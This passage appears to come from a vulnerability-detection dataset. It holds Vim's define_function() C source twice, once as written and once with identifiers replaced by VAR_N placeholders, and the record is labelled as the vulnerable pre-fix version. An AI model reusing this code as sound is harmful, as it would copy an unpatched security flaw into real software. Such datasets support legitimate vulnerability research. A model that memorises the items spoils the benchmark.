vim_free(VAR_18);
VAR_37 |= VAR_5;
return VAR_19;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/userfunc.c/vul/before/2.json,"ufunc_T *
define_function(exarg_T *eap, char_u *name_arg, garray_T *lines_to_free)
{
    int		j;
    int		c;
    int		saved_did_emsg;
    char_u	*name = name_arg;
    int		is_global = FALSE;
    char_u	*p;
    char_u	*arg;
    char_u	*whitep;
    char_u	*line_arg = NULL;
    garray_T	newargs;
    garray_T	argtypes;
    garray_T	default_args;
    garray_T	newlines;
    int		varargs = FALSE;
    int		flags = 0;
    char_u	*ret_type = NULL;
    ufunc_T	*fp = NULL;
    int		fp_allocated = FALSE;
    int		free_fp = FALSE;
    int		overwrite = FALSE;
    dictitem_T	*v;
    funcdict_T	fudi;
    static int	func_nr = 0;	    // number for nameless function
    int		paren;
    hashitem_T	*hi;
    linenr_T	sourcing_lnum_top;
    int		vim9script = in_vim9script();
    imported_T	*import = NULL;

    /*
     * "":function"" without argument: list functions.
     */
    if (ends_excmd2(eap->cmd, eap->arg))
    {
	if (!eap->skip)
	    list_functions(NULL);
	set_nextcmd(eap, eap->arg);
	return NULL;
    }

    /*
     * "":function /pat"": list functions matching pattern.
     */
    if (*eap->arg == '/')
    {
	p = skip_regexp(eap->arg + 1, '/', TRUE);
	if (!eap->skip)
	{
	    regmatch_T	regmatch;

	    c = *p;
	    *p = NUL;
	    regmatch.regprog = vim_regcomp(eap->arg + 1, RE_MAGIC);
	    *p = c;
	    if (regmatch.regprog != NULL)
	    {
		regmatch.rm_ic = p_ic;
		list_functions(&regmatch);
		vim_regfree(regmatch.regprog);
	    }
	}
	if (*p == '/')
	    ++p;
	set_nextcmd(eap, p);
	return NULL;
    }

    ga_init(&newargs);
    ga_init(&argtypes);
    ga_init(&default_args);

    /*
     * Get the function name.  There are these situations:
     * func	    normal function name
     *		    ""name"" == func, ""fudi.fd_dict"" == NULL
     * dict.func    new dictionary entry
     *		    ""name"" == NULL, ""fudi.fd_dict"" set,
     *		    ""fudi.fd_di"" == NULL, ""fudi.fd_newkey"" == func
     * dict.func    existing dict entry with a Funcref
     *		    ""name"" == func, ""fudi.fd_dict"" set,
     *		    ""fudi.fd_di"" set, ""fudi.fd_newkey"" == NULL
     * dict.func    existing dict entry that's not a Funcref
     *		    ""name"" == NULL, ""fudi.fd_dict"" set,
     *		    ""fudi.fd_di"" set, ""fudi.fd_newkey"" == NULL
     * s:func	    script-local function name
     * g:func	    global function name, same as ""func""
     */
    p = eap->arg;
    if (name_arg != NULL)
    {
	// nested function, argument is (args).
	paren = TRUE;
	CLEAR_FIELD(fudi);
    }
    else
    {
	name = save_function_name(&p, &is_global, eap->skip,
						       TFN_NO_AUTOLOAD, &fudi);
	paren = (vim_strchr(p, '(') != NULL);
	if (name == NULL && (fudi.fd_dict == NULL || !paren) && !eap->skip)
	{
	    /*
	     * Return on an invalid expression in braces, unless the expression
	     * evaluation has been cancelled due to an aborting error, an
	     * interrupt, or an exception.
	     */
	    if (!aborting())
	    {
		if (!eap->skip && fudi.fd_newkey != NULL)
		    semsg(_(e_key_not_present_in_dictionary), fudi.fd_newkey);
		vim_free(fudi.fd_newkey);
		return NULL;
	    }
	    else
		eap->skip = TRUE;
	}
    }

    // An error in a function call during evaluation of an expression in magic
    // braces should not cause the function not to be defined.
    saved_did_emsg = did_emsg;
    did_emsg = FALSE;

    /*
     * "":function func"" with only function name: list function.
     */
    if (!paren)
    {
	if (!ends_excmd(*skipwhite(p)))
	{
	    semsg(_(e_trailing_characters_str), p);
	    goto ret_free;
	}
	set_nextcmd(eap, p);
	if (eap->nextcmd != NULL)
	    *p = NUL;
	if (!eap->skip && !got_int)
	{
	    fp = find_func(name, is_global, NULL);
	    if (fp == NULL && ASCII_ISUPPER(*eap->arg))
	    {
		char_u *up = untrans_function_name(name);

		// With Vim9 script the name was made script-local, if not
		// found try again with the original name.
		if (up != NULL)
		    fp = find_func(up, FALSE, NULL);
	    }

	    if (fp != NULL)
	    {
		list_func_head(fp, TRUE);
		for (j = 0; j < fp->uf_lines.ga_len && !got_int; ++j)
		{
		    if (FUNCLINE(fp, j) == NULL)
			continue;
		    msg_putchar('\n');
		    msg_outnum((long)(j + 1));
		    if (j < 9)
			msg_putchar(' ');
		    if (j < 99)
			msg_putchar(' ');
		    msg_prt_line(FUNCLINE(fp, j), FALSE);
		    out_flush();	// show a line at a time
		    ui_breakcheck();
		}
		if (!got_int)
		{
		    msg_putchar('\n');
		    if (fp->uf_def_status != UF_NOT_COMPILED)
			msg_puts(""   enddef"");
		    else
			msg_puts(""   endfunction"");
		}
	    }
	    else
		emsg_funcname(e_undefined_function_str, eap->arg);
	}
	goto ret_free;
    }

    /*
     * "":function name(arg1, arg2)"" Define function.
     */
    p = skipwhite(p);
    if (*p != '(')
    {
	if (!eap->skip)
	{
	    semsg(_(e_missing_paren_str), eap->arg);
	    goto ret_free;
	}
	// attempt to continue by skipping some text
	if (vim_strchr(p, '(') != NULL)
	    p = vim_strchr(p, '(');
    }

    if ((vim9script || eap->cmdidx == CMD_def) && VIM_ISWHITE(p[-1]))
    {
	semsg(_(e_no_white_space_allowed_before_str_str), ""("", p - 1);
	goto ret_free;
    }

    // In Vim9 script only global functions can be redefined.
    if (vim9script && eap->forceit && !is_global)
    {
	emsg(_(e_no_bang_allowed));
	goto ret_free;
    }

    ga_init2(&newlines, (int)sizeof(char_u *), 10);

    if (!eap->skip && name_arg == NULL)
    {
	// Check the name of the function.  Unless it's a dictionary function
	// (that we are overwriting).
	if (name != NULL)
	    arg = name;
	else
	    arg = fudi.fd_newkey;
	if (arg != NULL && (fudi.fd_di == NULL
				     || (fudi.fd_di->di_tv.v_type != VAR_FUNC
				 && fudi.fd_di->di_tv.v_type != VAR_PARTIAL)))
	{
	    char_u  *name_base = arg;
	    int	    i;

	    if (*arg == K_SPECIAL)
	    {
		name_base = vim_strchr(arg, '_');
		if (name_base == NULL)
		    name_base = arg + 3;
		else
		    ++name_base;
	    }
	    for (i = 0; name_base[i] != NUL && (i == 0
					? eval_isnamec1(name_base[i])
					: eval_isnamec(name_base[i])); ++i)
		;
	    if (name_base[i] != NUL)
		emsg_funcname(e_invalid_argument_str, arg);

	    // In Vim9 script a function cannot have the same name as a
	    // variable.
	    if (vim9script && *arg == K_SPECIAL
		&& eval_variable(name_base, (int)STRLEN(name_base), 0, NULL,
		    NULL, EVAL_VAR_NOAUTOLOAD + EVAL_VAR_IMPORT
						     + EVAL_VAR_NO_FUNC) == OK)
	    {
		semsg(_(e_redefining_script_item_str), name_base);
		goto ret_free;
	    }
	}
	// Disallow using the g: dict.
	if (fudi.fd_dict != NULL && fudi.fd_dict->dv_scope == VAR_DEF_SCOPE)
	{
	    emsg(_(e_cannot_use_g_here));
	    goto ret_free;
	}
    }

    // This may get more lines and make the pointers into the first line
    // invalid.
    ++p;
    if (get_function_args(&p, ')', &newargs,
			eap->cmdidx == CMD_def ? &argtypes : NULL, FALSE,
			 NULL, &varargs, &default_args, eap->skip,
			 eap, lines_to_free) == FAIL)
	goto errret_2;
    whitep = p;

    if (eap->cmdidx == CMD_def)
    {
	// find the return type: :def Func(): type
	if (*skipwhite(p) == ':')
	{
	    if (*p != ':')
	    {
		semsg(_(e_no_white_space_allowed_before_colon_str), p);
		p = skipwhite(p);
	    }
	    else if (!IS_WHITE_OR_NUL(p[1]))
		semsg(_(e_white_space_required_after_str_str), "":"", p);
	    ret_type = skipwhite(p + 1);
	    p = skip_type(ret_type, FALSE);
	    if (p > ret_type)
	    {
		ret_type = vim_strnsave(ret_type, p - ret_type);
		whitep = p;
		p = skipwhite(p);
	    }
	    else
	    {
		semsg(_(e_expected_type_str), ret_type);
		ret_type = NULL;
	    }
	}
	p = skipwhite(p);
    }
    else
	// find extra arguments ""range"", ""dict"", ""abort"" and ""closure""
	for (;;)
	{
	    whitep = p;
	    p = skipwhite(p);
	    if (STRNCMP(p, ""range"", 5) == 0)
	    {
		flags |= FC_RANGE;
		p += 5;
	    }
	    else if (STRNCMP(p, ""dict"", 4) == 0)
	    {
		flags |= FC_DICT;
		p += 4;
	    }
	    else if (STRNCMP(p, ""abort"", 5) == 0)
	    {
		flags |= FC_ABORT;
		p += 5;
	    }
	    else if (STRNCMP(p, ""closure"", 7) == 0)
	    {
		flags |= FC_CLOSURE;
		p += 7;
		if (current_funccal == NULL)
		{
		    emsg_funcname(e_closure_function_should_not_be_at_top_level,
			    name == NULL ? (char_u *)"""" : name);
		    goto erret;
		}
	    }
	    else
		break;
	}

    // When there is a line break use what follows for the function body.
    // Makes 'exe ""func Test()\n...\nendfunc""' work.
    if (*p == '\n')
	line_arg = p + 1;
    else if (*p != NUL
	    && !(*p == '""' && (!vim9script || eap->cmdidx == CMD_function)
						     && eap->cmdidx != CMD_def)
	    && !(VIM_ISWHITE(*whitep) && *p == '#'
				     && (vim9script || eap->cmdidx == CMD_def))
	    && !eap->skip
	    && !did_emsg)
	semsg(_(e_trailing_characters_str), p);

    /*
     * Read the body of the function, until ""}"", "":endfunction"" or "":enddef"" is
     * found.
     */
    if (KeyTyped)
    {
	// Check if the function already exists, don't let the user type the
	// whole function before telling him it doesn't work!  For a script we
	// need to skip the body to be able to find what follows.
	if (!eap->skip && !eap->forceit)
	{
	    if (fudi.fd_dict != NULL && fudi.fd_newkey == NULL)
		emsg(_(e_dictionary_entry_already_exists));
	    else if (name != NULL && find_func(name, is_global, NULL) != NULL)
		emsg_funcname(e_function_str_already_exists_add_bang_to_replace, name);
	}

	if (!eap->skip && did_emsg)
	    goto erret;

	msg_putchar('\n');	    // don't overwrite the function name
	cmdline_row = msg_row;
    }

    // Save the starting line number.
    sourcing_lnum_top = SOURCING_LNUM;

    // Do not define the function when getting the body fails and when
    // skipping.
    if (get_function_body(eap, &newlines, line_arg, lines_to_free) == FAIL
	    || eap->skip)
	goto erret;

    /*
     * If there are no errors, add the function
     */
    if (fudi.fd_dict == NULL)
    {
	hashtab_T	*ht;

	v = find_var(name, &ht, TRUE);
	if (v != NULL && v->di_tv.v_type == VAR_FUNC)
	{
	    emsg_funcname(e_function_name_conflicts_with_variable_str, name);
	    goto erret;
	}

	fp = find_func_even_dead(name, is_global, NULL);
	if (vim9script)
	{
	    char_u *uname = untrans_function_name(name);

	    import = find_imported(uname == NULL ? name : uname, 0, NULL);
	}

	if (fp != NULL || import != NULL)
	{
	    int dead = fp != NULL && (fp->uf_flags & FC_DEAD);

	    // Function can be replaced with ""function!"" and when sourcing the
	    // same script again, but only once.
	    // A name that is used by an import can not be overruled.
	    if (import != NULL
		    || (!dead && !eap->forceit
			&& (fp->uf_script_ctx.sc_sid != current_sctx.sc_sid
			  || fp->uf_script_ctx.sc_seq == current_sctx.sc_seq)))
	    {
		SOURCING_LNUM = sourcing_lnum_top;
		if (vim9script)
		    emsg_funcname(e_name_already_defined_str, name);
		else
		    emsg_funcname(e_function_str_already_exists_add_bang_to_replace, name);
		goto erret;
	    }
	    if (fp->uf_calls > 0)
	    {
		emsg_funcname(
			    e_cannot_redefine_function_str_it_is_in_use, name);
		goto erret;
	    }
	    if (fp->uf_refcount > 1)
	    {
		// This function is referenced somewhere, don't redefine it but
		// create a new one.
		--fp->uf_refcount;
		fp->uf_flags |= FC_REMOVED;
		fp = NULL;
		overwrite = TRUE;
	    }
	    else
	    {
		char_u *exp_name = fp->uf_name_exp;

		// redefine existing function, keep the expanded name
		VIM_CLEAR(name);
		fp->uf_name_exp = NULL;
		func_clear_items(fp);
		fp->uf_name_exp = exp_name;
		fp->uf_flags &= ~FC_DEAD;
#ifdef FEAT_PROFILE
		fp->uf_profiling = FALSE;
		fp->uf_prof_initialized = FALSE;
#endif
		fp->uf_def_status = UF_NOT_COMPILED;
	    }
	}
    }
    else
    {
	char	numbuf[20];

	fp = NULL;
	if (fudi.fd_newkey == NULL && !eap->forceit)
	{
	    emsg(_(e_dictionary_entry_already_exists));
	    goto erret;
	}
	if (fudi.fd_di == NULL)
	{
	    // Can't add a function to a locked dictionary
	    if (value_check_lock(fudi.fd_dict->dv_lock, eap->arg, FALSE))
		goto erret;
	}
	    // Can't change an existing function if it is locked
	else if (value_check_lock(fudi.fd_di->di_tv.v_lock, eap->arg, FALSE))
	    goto erret;

	// Give the function a sequential number.  Can only be used with a
	// Funcref!
	vim_free(name);
	sprintf(numbuf, ""%d"", ++func_nr);
	name = vim_strsave((char_u *)numbuf);
	if (name == NULL)
	    goto erret;
    }

    if (fp == NULL)
    {
	if (fudi.fd_dict == NULL && vim_strchr(name, AUTOLOAD_CHAR) != NULL)
	{
	    int	    slen, plen;
	    char_u  *scriptname;

	    // Check that the autoload name matches the script name.
	    j = FAIL;
	    if (SOURCING_NAME != NULL)
	    {
		scriptname = autoload_name(name);
		if (scriptname != NULL)
		{
		    p = vim_strchr(scriptname, '/');
		    plen = (int)STRLEN(p);
		    slen = (int)STRLEN(SOURCING_NAME);
		    if (slen > plen && fnamecmp(p,
					    SOURCING_NAME + slen - plen) == 0)
			j = OK;
		    vim_free(scriptname);
		}
	    }
	    if (j == FAIL)
	    {
		linenr_T save_lnum = SOURCING_LNUM;

		SOURCING_LNUM = sourcing_lnum_top;
		semsg(_(e_function_name_does_not_match_script_file_name_str),
									 name);
		SOURCING_LNUM = save_lnum;
		goto erret;
	    }
	}

	fp = alloc_clear(offsetof(ufunc_T, uf_name) + STRLEN(name) + 1);
	if (fp == NULL)
	    goto erret;
	fp_allocated = TRUE;

	if (fudi.fd_dict != NULL)
	{
	    if (fudi.fd_di == NULL)
	    {
		// add new dict entry
		fudi.fd_di = dictitem_alloc(fudi.fd_newkey);
		if (fudi.fd_di == NULL)
		{
		    vim_free(fp);
		    fp = NULL;
		    goto erret;
		}
		if (dict_add(fudi.fd_dict, fudi.fd_di) == FAIL)
		{
		    vim_free(fudi.fd_di);
		    vim_free(fp);
		    fp = NULL;
		    goto erret;
		}
	    }
	    else
		// overwrite existing dict entry
		clear_tv(&fudi.fd_di->di_tv);
	    fudi.fd_di->di_tv.v_type = VAR_FUNC;
	    fudi.fd_di->di_tv.vval.v_string = vim_strsave(name);

	    // behave like ""dict"" was used
	    flags |= FC_DICT;
	}
    }
    fp->uf_args = newargs;
    fp->uf_def_args = default_args;
    fp->uf_ret_type = &t_any;
    fp->uf_func_type = &t_func_any;

    if (eap->cmdidx == CMD_def)
    {
	int	    lnum_save = SOURCING_LNUM;
	cstack_T    *cstack = eap->cstack;

	fp->uf_def_status = UF_TO_BE_COMPILED;

	// error messages are for the first function line
	SOURCING_LNUM = sourcing_lnum_top;

	// The function may use script variables from the context.
	function_using_block_scopes(fp, cstack);

	if (parse_argument_types(fp, &argtypes, varargs) == FAIL)
	{
	    SOURCING_LNUM = lnum_save;
	    free_fp = fp_allocated;
	    goto erret;
	}
	varargs = FALSE;

	// parse the return type, if any
	if (parse_return_type(fp, ret_type) == FAIL)
	{
	    SOURCING_LNUM = lnum_save;
	    free_fp = fp_allocated;
	    goto erret;
	}
	SOURCING_LNUM = lnum_save;
    }
    else
	fp->uf_def_status = UF_NOT_COMPILED;

    if (fp_allocated)
    {
	// insert the new function in the function list
	set_ufunc_name(fp, name);
	if (overwrite)
	{
	    hi = hash_find(&func_hashtab, name);
	    hi->hi_key = UF2HIKEY(fp);
	}
	else if (hash_add(&func_hashtab, UF2HIKEY(fp)) == FAIL)
	{
	    free_fp = TRUE;
	    goto erret;
	}
	fp->uf_refcount = 1;
    }

    fp->uf_lines = newlines;
    newlines.ga_data = NULL;
    if ((flags & FC_CLOSURE) != 0)
    {
	if (register_closure(fp) == FAIL)
	    goto erret;
    }
    else
	fp->uf_scoped = NULL;

#ifdef FEAT_PROFILE
    if (prof_def_func())
	func_do_profile(fp);
#endif
    fp->uf_varargs = varargs;
    if (sandbox)
	flags |= FC_SANDBOX;
    if (vim9script && !ASCII_ISUPPER(*fp->uf_name))
	flags |= FC_VIM9;
    fp->uf_flags = flags;
    fp->uf_calls = 0;
    fp->uf_cleared = FALSE;
    fp->uf_script_ctx = current_sctx;
    fp->uf_script_ctx_version = current_sctx.sc_version;
    fp->uf_script_ctx.sc_lnum += sourcing_lnum_top;
    if (is_export)
    {
	fp->uf_flags |= FC_EXPORT;
	// let ex_export() know the export worked.
	is_export = FALSE;
    }

    if (eap->cmdidx == CMD_def)
	set_function_type(fp);
    else if (fp->uf_script_ctx.sc_version == SCRIPT_VERSION_VIM9)
	// :func does not use Vim9 script syntax, even in a Vim9 script file
	fp->uf_script_ctx.sc_version = SCRIPT_VERSION_MAX;

    goto ret_free;

erret:
    ga_clear_strings(&newargs);
    ga_clear_strings(&default_args);
    if (fp != NULL)
    {
	ga_init(&fp->uf_args);
	ga_init(&fp->uf_def_args);
    }
errret_2:
    ga_clear_strings(&newlines);
    if (fp != NULL)
	VIM_CLEAR(fp->uf_arg_types);
    if (free_fp)
    {
	vim_free(fp);
	fp = NULL;
    }
ret_free:
    ga_clear_strings(&argtypes);
    vim_free(fudi.fd_newkey);
    if (name != name_arg)
	vim_free(name);
    vim_free(ret_type);
    did_emsg |= saved_did_emsg;

    return fp;
}","ufunc_T *
define_function(exarg_T *VAR_0, char_u *VAR_1, garray_T *VAR_2)
{
    int		VAR_3;
    int		VAR_4;
    int		VAR_5;
    char_u	*VAR_6 = VAR_1;
    int		VAR_7 = FALSE;
    char_u	*VAR_8;
    char_u	*VAR_9;
    char_u	*VAR_10;
    char_u	*VAR_11 = NULL;
    garray_T	VAR_12;
    garray_T	VAR_13;
    garray_T	VAR_14;
    garray_T	VAR_15;
    int		VAR_16 = FALSE;
    int		VAR_17 = 0;
    char_u	*VAR_18 = NULL;
    ufunc_T	*VAR_19 = NULL;
    int		VAR_20 = FALSE;
    int		VAR_21 = FALSE;
    int		VAR_22 = FALSE;
    dictitem_T	*VAR_23;
    funcdict_T	VAR_24;
    static int	VAR_25 = 0;	    /* COMMENT_0 */
    int		VAR_26;
    hashitem_T	*VAR_27;
    linenr_T	VAR_28;
    int		VAR_29 = in_vim9script();
    imported_T	*VAR_30 = NULL;

    /* COMMENT_1 */
                                                    
       
    if (ends_excmd2(VAR_0->cmd, VAR_0->arg))
    {
	if (!VAR_0->skip)
	    list_functions(NULL);
	set_nextcmd(VAR_0, VAR_0->arg);
	return NULL;
    }

    /* COMMENT_4 */
                                                         
       
    if (*VAR_0->arg == '/')
    {
	VAR_8 = skip_regexp(VAR_0->arg + 1, '/', TRUE);
	if (!VAR_0->skip)
	{
	    regmatch_T	VAR_31;

	    VAR_4 = *VAR_8;
	    *VAR_8 = VAR_32;
	    VAR_31.regprog = vim_regcomp(VAR_0->arg + 1, VAR_33);
	    *VAR_8 = VAR_4;
	    if (VAR_31.regprog != NULL)
	    {
		VAR_31.rm_ic = VAR_34;
		list_functions(&VAR_31);
		vim_regfree(VAR_31.regprog);
	    }
	}
	if (*VAR_8 == '/')
	    ++VAR_8;
	set_nextcmd(VAR_0, VAR_8);
	return NULL;
    }

    ga_init(&VAR_12);
    ga_init(&VAR_13);
    ga_init(&VAR_14);

    /* COMMENT_7 */
                                                          
                                    
                                                  
                                        
                                               
                                                          
                                                      
                                               
                                                      
                                                            
                                               
                                                      
                                            
                                                      
       
    VAR_8 = VAR_0->arg;
    if (VAR_1 != NULL)
    {
	/* COMMENT_21 */
	VAR_26 = TRUE;
	CLEAR_FIELD(VAR_24);
    }
    else
    {
	VAR_6 = save_function_name(&VAR_8, &VAR_7, VAR_0->skip,
						       VAR_35, &VAR_24);
	VAR_26 = (vim_strchr(VAR_8, '(') != NULL);
	if (VAR_6 == NULL && (VAR_24.fd_dict == NULL || !VAR_26) && !VAR_0->skip)
	{
	    /* COMMENT_22 */
                                                                        
                                                                  
                                   
        
	    if (!aborting())
	    {
		if (!VAR_0->skip && VAR_24.fd_newkey != NULL)
		    semsg(_(VAR_36), VAR_24.fd_newkey);
		vim_free(VAR_24.fd_newkey);
		return NULL;
	    }
	    else
		VAR_0->skip = TRUE;
	}
    }

    /* COMMENT_27 */
    /* COMMENT_28 */
    VAR_5 = VAR_37;
    VAR_37 = FALSE;

    /* COMMENT_29 */
                                                               
       
    if (!VAR_26)
    {
	if (!ends_excmd(*skipwhite(VAR_8)))
	{
	    semsg(_(VAR_38), VAR_8);
	    goto ret_free;
	}
	set_nextcmd(VAR_0, VAR_8);
	if (VAR_0->nextcmd != NULL)
	    *VAR_8 = VAR_32;
	if (!VAR_0->skip && !VAR_39)
	{
	    VAR_19 = find_func(VAR_6, VAR_7, NULL);
	    if (VAR_19 == NULL && ASCII_ISUPPER(*VAR_0->arg))
	    {
		char_u *VAR_40 = untrans_function_name(VAR_6);

		/* COMMENT_32 */
		/* COMMENT_33 */
		if (VAR_40 != NULL)
		    VAR_19 = find_func(VAR_40, FALSE, NULL);
	    }

	    if (VAR_19 != NULL)
	    {
		list_func_head(VAR_19, TRUE);
		for (VAR_3 = 0; VAR_3 < VAR_19->uf_lines.ga_len && !VAR_39; ++VAR_3)
		{
		    if (FUNCLINE(VAR_19, VAR_3) == NULL)
			continue;
		    msg_putchar('\n');
		    msg_outnum((long)(VAR_3 + 1));
		    if (VAR_3 < 9)
			msg_putchar(' ');
		    if (VAR_3 < 99)
			msg_putchar(' ');
		    msg_prt_line(FUNCLINE(VAR_19, VAR_3), FALSE);
		    out_flush();	/* COMMENT_34 */
		    ui_breakcheck();
		}
		if (!VAR_39)
		{
		    msg_putchar('\n');
		    if (VAR_19->uf_def_status != VAR_41)
			msg_puts(""   enddef"");
		    else
			msg_puts(""   endfunction"");
		}
	    }
	    else
		emsg_funcname(VAR_42, VAR_0->arg);
	}
	goto ret_free;
    }

    /* COMMENT_35 */
                                                    
       
    VAR_8 = skipwhite(VAR_8);
    if (*VAR_8 != '(')
    {
	if (!VAR_0->skip)
	{
	    semsg(_(VAR_43), VAR_0->arg);
	    goto ret_free;
	}
	/* COMMENT_38 */
	if (vim_strchr(VAR_8, '(') != NULL)
	    VAR_8 = vim_strchr(VAR_8, '(');
    }

    if ((VAR_29 || VAR_0->cmdidx == VAR_44) && VIM_ISWHITE(VAR_8[-1]))
    {
	semsg(_(VAR_45), ""("", VAR_8 - 1);
	goto ret_free;
    }

    /* COMMENT_39 */
    if (VAR_29 && VAR_0->forceit && !VAR_7)
    {
	emsg(_(VAR_46));
	goto ret_free;
    }

    ga_init2(&VAR_15, (int)sizeof(char_u *), 10);

    if (!VAR_0->skip && VAR_1 == NULL)
    {
	/* COMMENT_40 */
	/* COMMENT_41 */
	if (VAR_6 != NULL)
	    VAR_9 = VAR_6;
	else
	    VAR_9 = VAR_24.fd_newkey;
	if (VAR_9 != NULL && (VAR_24.fd_di == NULL
				     || (VAR_24.fd_di->di_tv.v_type != VAR_47
				 && VAR_24.fd_di->di_tv.v_type != VAR_48)))
	{
	    char_u  *VAR_49 = VAR_9;
	    int	    VAR_50;

	    if (*VAR_9 == VAR_51)
	    {
		VAR_49 = vim_strchr(VAR_9, '_');
		if (VAR_49 == NULL)
		    VAR_49 = VAR_9 + 3;
		else
		    ++VAR_49;
	    }
	    for (VAR_50 = 0; VAR_49[VAR_50] != VAR_32 && (VAR_50 == 0
					? eval_isnamec1(VAR_49[VAR_50])
					: eval_isnamec(VAR_49[VAR_50])); ++VAR_50)
		;
	    if (VAR_49[VAR_50] != VAR_32)
		emsg_funcname(VAR_52, VAR_9);

	    /* COMMENT_42 */
	    /* COMMENT_43 */
	    if (VAR_29 && *VAR_9 == VAR_51
		&& eval_variable(VAR_49, (int)STRLEN(VAR_49), 0, NULL,
		    NULL, VAR_53 + VAR_54
						     + VAR_55) == VAR_56)
	    {
		semsg(_(VAR_57), VAR_49);
		goto ret_free;
	    }
	}
	/* COMMENT_44 */
	if (VAR_24.fd_dict != NULL && VAR_24.fd_dict->dv_scope == VAR_58)
	{
	    emsg(_(VAR_59));
	    goto ret_free;
	}
    }

    /* COMMENT_45 */
    /* COMMENT_46 */
    ++VAR_8;
    if (get_function_args(&VAR_8, ')', &VAR_12,
			VAR_0->cmdidx == VAR_44 ? &VAR_13 : NULL, FALSE,
			 NULL, &VAR_16, &VAR_14, VAR_0->skip,
			 VAR_0, VAR_2) == VAR_60)
	goto errret_2;
    VAR_10 = VAR_8;

    if (VAR_0->cmdidx == VAR_44)
    {
	/* COMMENT_47 */
	if (*skipwhite(VAR_8) == ':')
	{
	    if (*VAR_8 != ':')
	    {
		semsg(_(VAR_61), VAR_8);
		VAR_8 = skipwhite(VAR_8);
	    }
	    else if (!IS_WHITE_OR_NUL(VAR_8[1]))
		semsg(_(VAR_62), "":"", VAR_8);
	    VAR_18 = skipwhite(VAR_8 + 1);
	    VAR_8 = skip_type(VAR_18, FALSE);
	    if (VAR_8 > VAR_18)
	    {
		VAR_18 = vim_strnsave(VAR_18, VAR_8 - VAR_18);
		VAR_10 = VAR_8;
		VAR_8 = skipwhite(VAR_8);
	    }
	    else
	    {
		semsg(_(VAR_63), VAR_18);
		VAR_18 = NULL;
	    }
	}
	VAR_8 = skipwhite(VAR_8);
    }
    else
	/* COMMENT_48 */
	for (;;)
	{
	    VAR_10 = VAR_8;
	    VAR_8 = skipwhite(VAR_8);
	    if (STRNCMP(VAR_8, ""range"", 5) == 0)
	    {
		VAR_17 |= VAR_64;
		VAR_8 += 5;
	    }
	    else if (STRNCMP(VAR_8, ""dict"", 4) == 0)
	    {
		VAR_17 |= VAR_65;
		VAR_8 += 4;
	    }
	    else if (STRNCMP(VAR_8, ""abort"", 5) == 0)
	    {
		VAR_17 |= VAR_66;
		VAR_8 += 5;
	    }
	    else if (STRNCMP(VAR_8, ""closure"", 7) == 0)
	    {
		VAR_17 |= VAR_67;
		VAR_8 += 7;
		if (VAR_68 == NULL)
		{
		    emsg_funcname(VAR_69,
			    VAR_6 == NULL ? (char_u *)"""" : VAR_6);
		    goto erret;
		}
	    }
	    else
		break;
	}

    /* COMMENT_49 */
    /* COMMENT_50 */
    if (*VAR_8 == '\n')
	VAR_11 = VAR_8 + 1;
    else if (*VAR_8 != VAR_32
	    && !(*VAR_8 == '""' && (!VAR_29 || VAR_0->cmdidx == VAR_70)
						     && VAR_0->cmdidx != VAR_44)
	    && !(VIM_ISWHITE(*VAR_10) && *VAR_8 == '#'
				     && (VAR_29 || VAR_0->cmdidx == VAR_44))
	    && !VAR_0->skip
	    && !VAR_37)
	semsg(_(VAR_38), VAR_8);

    /* COMMENT_51 */
                                                                               
             
       
    if (VAR_71)
    {
	/* COMMENT_55 */
	/* COMMENT_56 */
	/* COMMENT_57 */
	if (!VAR_0->skip && !VAR_0->forceit)
	{
	    if (VAR_24.fd_dict != NULL && VAR_24.fd_newkey == NULL)
		emsg(_(VAR_72));
	    else if (VAR_6 != NULL && find_func(VAR_6, VAR_7, NULL) != NULL)
		emsg_funcname(VAR_73, VAR_6);
	}

	if (!VAR_0->skip && VAR_37)
	    goto erret;

	msg_putchar('\n');	    /* COMMENT_58 */
	VAR_74 = VAR_75;
    }

    /* COMMENT_59 */
    VAR_28 = VAR_76;

    /* COMMENT_60 */
    /* COMMENT_61 */
    if (get_function_body(VAR_0, &VAR_15, VAR_11, VAR_2) == VAR_60
	    || VAR_0->skip)
	goto erret;

    /* COMMENT_62 */
                                               
       
    if (VAR_24.fd_dict == NULL)
    {
	hashtab_T	*VAR_77;

	VAR_23 = find_var(VAR_6, &VAR_77, TRUE);
	if (VAR_23 != NULL && VAR_23->di_tv.v_type == VAR_47)
	{
	    emsg_funcname(VAR_78, VAR_6);
	    goto erret;
	}

	VAR_19 = find_func_even_dead(VAR_6, VAR_7, NULL);
	if (VAR_29)
	{
	    char_u *VAR_79 = untrans_function_name(VAR_6);

	    VAR_30 = find_imported(VAR_79 == NULL ? VAR_6 : VAR_79, 0, NULL);
	}

	if (VAR_19 != NULL || VAR_30 != NULL)
	{
	    int VAR_80 = VAR_19 != NULL && (VAR_19->uf_flags & VAR_81);

	    /* COMMENT_65 */
	    /* COMMENT_66 */
	    /* COMMENT_67 */
	    if (VAR_30 != NULL
		    || (!VAR_80 && !VAR_0->forceit
			&& (VAR_19->uf_script_ctx.sc_sid != VAR_82.sc_sid
			  || VAR_19->uf_script_ctx.sc_seq == VAR_82.sc_seq)))
	    {
		VAR_76 = VAR_28;
		if (VAR_29)
		    emsg_funcname(VAR_83, VAR_6);
		else
		    emsg_funcname(VAR_73, VAR_6);
		goto erret;
	    }
	    if (VAR_19->uf_calls > 0)
	    {
		emsg_funcname(
			    VAR_84, VAR_6);
		goto erret;
	    }
	    if (VAR_19->uf_refcount > 1)
	    {
		/* COMMENT_68 */
		/* COMMENT_69 */
		--VAR_19->uf_refcount;
		VAR_19->uf_flags |= VAR_85;
		VAR_19 = NULL;
		VAR_22 = TRUE;
	    }
	    else
	    {
		char_u *VAR_86 = VAR_19->uf_name_exp;

		/* COMMENT_70 */
		VIM_CLEAR(VAR_6);
		VAR_19->uf_name_exp = NULL;
		func_clear_items(VAR_19);
		VAR_19->uf_name_exp = VAR_86;
		VAR_19->uf_flags &= ~VAR_81;
#ifdef VAR_87
		VAR_19->uf_profiling = FALSE;
		VAR_19->uf_prof_initialized = FALSE;
#endif
		VAR_19->uf_def_status = VAR_41;
	    }
	}
    }
    else
    {
	char	VAR_88[20];

	VAR_19 = NULL;
	if (VAR_24.fd_newkey == NULL && !VAR_0->forceit)
	{
	    emsg(_(VAR_72));
	    goto erret;
	}
	if (VAR_24.fd_di == NULL)
	{
	    /* COMMENT_71 */
	    if (value_check_lock(VAR_24.fd_dict->dv_lock, VAR_0->arg, FALSE))
		goto erret;
	}
	    /* COMMENT_72 */
	else if (value_check_lock(VAR_24.fd_di->di_tv.v_lock, VAR_0->arg, FALSE))
	    goto erret;

	/* COMMENT_73 */
	/* COMMENT_74 */
